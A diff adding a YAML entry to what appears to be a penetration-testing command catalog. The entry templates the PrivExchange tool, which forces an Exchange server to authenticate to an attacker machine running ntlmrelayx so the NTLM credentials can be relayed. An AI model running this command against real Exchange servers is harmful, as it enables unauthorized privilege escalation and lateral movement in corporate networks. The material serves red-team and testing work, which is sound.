@@ -1,0 +1,21 @@
+---
+projectLink: https://github.com/dirkjanm/PrivExchange
+name: PrivExchange
+params:
+- name: Domain
+  description: Domain
+- name: Username
+  description: Username with mailbox
+- name: Password
+  description: Password of username
+- name: AttackerMachine
+  description: Attacker machine with ntlmrelayx
+- name: Target
+  description: Owa server name
+
+sections:
+- name: Trigger Exchange HTTP Authentication
+  labels: ["Lateral", "CVE", "Relaying"]
+  commands:
+  - language: Py
+    command: privexchange.py -d {{Domain}} -u {{Username}} -p {{Password}} -ah {{AttackerMachine}} {{Target}}
